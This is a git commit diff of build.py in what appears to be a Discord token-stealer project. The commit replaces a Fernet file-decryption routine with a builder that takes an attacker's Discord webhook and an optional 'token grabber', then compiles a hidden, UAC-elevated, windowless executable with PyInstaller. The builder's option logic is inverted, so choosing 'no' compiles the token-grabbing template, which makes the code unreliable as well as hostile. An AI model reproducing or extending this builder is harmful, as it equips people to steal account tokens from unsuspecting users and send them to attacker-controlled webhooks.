23b4b3abe2513008ad59abeccb100c923ee09816
Null <66488397+NullByte75@users.noreply.github.com>
2021-01-09 14:57:01 +0100

    i pasted the wrong code from vscode i'm so dumb

--- build.py
+++ build.py
@@ -1,30 +1,33 @@
+import subprocess
 import os
-from cryptography.fernet import Fernet
-import re
-from pathlib import Path
 
-def decrypt(key, filename):
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-        encrypted_data = file.read()
-    decrypted_data = f.decrypt(encrypted_data)
-    with open(filename, "wb") as file:
-        file.write(decrypted_data)
+user = str(os.environ["USERNAME"])
+
+def compile(code, name):
+    print("Creating main script...")
+    f = open("main.py", "w")
+    f.write(code)
+    f.close()
+    print("Compiling code...")
+    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe main.py --uac-admin --onefile --noconsole --name " + name, shell=True)
+    print("Compile complete!")
 
 def main():
-    file = input("Enter file to decrypt>>> ")
-    key = input(str("Enter key for decryption>>>"))
-    decrypt(key,file)
-    print("Done!")
-    print("Do you want to decrypt again?")
-    choice = input(str("1: Yes\n2: No\n>>>"))
-    if choice == "1":
-        main()
-    if choice == "2":
-        print("Exiting...")
-        exit()
-    else:
-        print("Unknown choice exiting...")
-        exit()
+    name = input(str("Enter name for executable: "))
+    discordname = input(str("Enter your Discord name and tag: "))
+    webhook = input(str("Enter Discord webhook: "))
+    tokengrabber = input(str("Do you want to enable the token grabber?\n1 yes\n2 no: "))
+    with open("src\\withouttoken.py", "r") as file:
+        filedata = file.read()
+    with open("src\\withtoken.py", "r") as file:
+        filedata2 = file.read()
+    code = filedata.replace('yourname', discordname)
+    code2 = filedata2.replace('yourname', discordname)
+    code3 = code2.replace('webhook', webhook)
+    code4 = code.replace('webhook', webhook)
+    if tokengrabber == "2":    
+        compile(code3, name)
+    if tokengrabber == "1":
+        compile(code4, name)
 
 main()
